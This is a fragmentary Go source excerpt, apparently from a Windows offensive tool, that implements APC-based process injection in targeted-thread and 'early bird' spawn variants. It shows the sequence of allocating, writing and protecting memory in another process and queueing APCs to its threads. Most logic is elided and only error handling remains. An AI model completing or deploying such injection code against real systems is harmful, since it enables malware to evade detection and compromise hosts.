...
func injectViaAPCEarlyBird(cfg *InjectConfig) *InjectResult {
...
func injectViaAPCTarget(cfg *InjectConfig, pid uint32) *InjectResult {
	...
	if ret == 0 {
		return &InjectResult{Success: false, Message: fmt.Sprintf("OpenProcess(%d) failed", pid)}
	}
	...
	if ret == 0 {
		return &InjectResult{Success: false, Message: "VirtualAllocEx failed"}
	}
	remoteAddr := ret
	...
	if ret == 0 {
		...
		return &InjectResult{Success: false, Message: "WriteProcessMemory failed"}
	}
	...
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(hProcess), remoteAddr, 0, MEM_RELEASE)
		return &InjectResult{Success: false, Message: "VirtualProtectEx failed"}
	}

	// 5. 枚举线程
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return &InjectResult{Success: false, Message: "CreateToolhelp32Snapshot failed"}
	}
	...
	if !applied {
		return &InjectResult{Success: false, Message: "QueueUserAPC failed for all threads"}
	}
...
func injectViaAPCEarlyBirdSpawn(cfg *InjectConfig) *InjectResult {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	...
	if ret == 0 {
		return &InjectResult{Success: false, Message: "CreateProcess failed"}
	}
	...
	if ret == 0 {
		procVirtualFreeEx.Call(uintptr(pi.Process), remoteAddr, 0, MEM_RELEASE)
		syscall.TerminateProcess(pi.Process, 0)
		return &InjectResult{Success: false, Message: "QueueUserAPC failed"}
	}
